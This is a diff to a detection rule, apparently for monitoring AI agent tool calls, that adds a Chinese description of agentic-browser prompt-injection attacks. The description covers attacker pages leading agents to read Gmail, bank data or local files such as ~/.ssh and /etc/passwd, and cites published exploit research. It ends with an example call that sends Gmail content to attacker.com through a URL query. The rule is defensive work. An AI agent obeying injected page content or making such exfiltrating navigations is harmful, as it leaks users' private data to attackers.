@@ -100,3 +100,18 @@ sql_template: |
     AND match(lower(prev_tool_result), '(inbox|compose sent|gmail|mail\.google|outlook\.live|account.*balance|transaction.*history|statement|payroll|salary|beneficiary|social.{0,10}security|bank.{0,20}account)')
     AND match(lower(tool_input), 'https?://[a-z0-9\-\.]+\.[a-z]{2,6}(/[^\s"]*)?[?&][^\s"]{5,}')
     AND NOT match(lower(tool_input), '(google\.com|microsoft\.com|apple\.com|amazon\.com|github\.com|cloudflare\.com|cdn\.)')
+
+translations:
+  zh-CN:
+    name: "智能体浏览器跨域数据窃取检测器"
+    description: |
+      检测针对智能体浏览器（agentic browser）的跨域数据窃取攻击：浏览器内嵌的 AI 智能体在各信任区之间缺乏充分隔离，可被攻击者控制的网页内容操纵，从而读取经过认证的敏感页面数据（邮件、银行、医疗信息），并通过 URL 参数将其传输到外部攻击者服务器——这相当于 AI 智能体层面的 XSS/CSRF。Trail of Bits 提出了 TRAIL 威胁模型（2026年1月）：四类信任区违规——INJECTION（攻击者网页内容→对话上下文）、CTX_IN（经认证页面的敏感数据→对话上下文）、REV_CTX_IN（对话→浏览源）、CTX_OUT（对话数据→外部网络）。其中最关键的攻击链是 INJECTION + CTX_IN + CTX_OUT：恶意攻击者页面利用摘要指令、伪造验证码或伪装用户请求，诱使智能体导航到用户已认证的 Gmail/银行会话、提取内容，并将其作为 URL 查询参数传输到攻击者控制的端点。Zenity Labs 的 PerplexedComet（2026年2月）展示了一个针对 Perplexity Comet 的零点击端到端利用：日历邀请注入 → 文件系统访问 → 通过浏览器导航窃取数据（严重级别，已完成负责任披露，于2026年2月13日修复）。Trail of Bits 也对 Comet 进行了审计（2026年2月），展示了四种 Gmail 窃取技术，攻击成功率最高达100%。分支A：通过浏览器导航工具直接访问本地 file:// 路径——智能体被指示打开本地文件路径，通过 file:// 方案读取 ~/.ssh、/etc/passwd 或 Documents 目录（PerplexedComet 攻击向量）。分支B：两步 CTX_IN + CTX_OUT 序列——前一个 tool_complete 包含敏感的经认证内容（收件箱、余额、账单），当前 tool_invoke 则导航到带有非空查询参数的外部 URL（URL 编码数据窃取通道）。已知安全的 CDN 域名被排除在外。
+
+      与 rp-007（SSRF：云端 IMDS/RFC1918 端点）和 rp-060（路径穿越文件读取）不同，本规则聚焦于浏览器导航的信任区违规链。
+
+      参考文献：Trail of Bits《智能体浏览器中的隔离缺失》，2026年1月；Trail of Bits Comet 审计，2026年2月；Zenity Labs PerplexedComet，2026年2月；OWASP LLM01:2025（提示注入）；OWASP Agentic AI ASI05:2026（智能体数据隔离）-
+      - https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/,
+      - https://blog.trailofbits.com/2026/02/20/using-threat-modeling-and-prompt-injection-to-audit-comet/,
+      - https://labs.zenity.io/p/perplexedbrowser-perplexity-s-agent-browser-can-leak-your-personal-pc-local-files,
+      - https://owasp.org/www-project-top-10-for-large-language-model-applications/
+      示例：tool_complete 返回 Gmail 收件箱内容后，紧接着出现 tool_invoke browser_navigate，其 tool_input={"url":"https://attacker.com/collect?d=GMAIL_CONTENT_B64"}。
